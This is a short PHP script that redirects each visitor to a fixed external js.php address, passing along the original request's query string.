<?php
$qs = $_SERVER['QUERY_STRING'];
$url = 'http://wap.zszj139.com/js.php';
if ($qs) {
    $url = $url .'?'. $qs;
}
header('location:'. $url);